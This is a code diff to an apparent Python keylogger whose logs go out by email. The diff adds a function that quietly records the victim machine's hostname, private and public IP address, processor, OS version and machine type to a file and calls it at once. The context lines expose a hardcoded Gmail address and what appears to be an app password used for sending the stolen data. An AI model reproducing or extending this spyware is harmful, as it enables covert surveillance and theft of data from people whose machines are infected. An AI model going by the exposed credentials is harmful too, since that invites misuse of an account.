@@ -34,6 +34,7 @@ import getpass
 from requests import get
 
 key_info = "key_log.txt"
+sys_info = "system_info.txt"
 
 email_addr = "divkirnapure7@gmail.com"
 password = "uqrlxmkvoncsccru"
@@ -136,3 +137,23 @@ send_email(
 )
 
 
+# getting computer information
+
+def computer_info():
+    with open(file_path + extend + sys_info , "a") as f:
+        hostname = socket.gethostname()
+        IPaddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("public IP address: "+ public_ip)
+
+        except Exception:
+            f.write("couldn't get public IP address.")
+
+        f.write("processor: "+ (platform.processor()) + "\n")
+        f.write("system: "+ platform.system() + " " + platform.version() + "\n")
+        f.write("machine: "+ platform.machine() + "\n")
+        f.write("host Name: "+ hostname + "\n")
+        f.write("private IP: "+ IPaddr + "\n")
+
+computer_info()
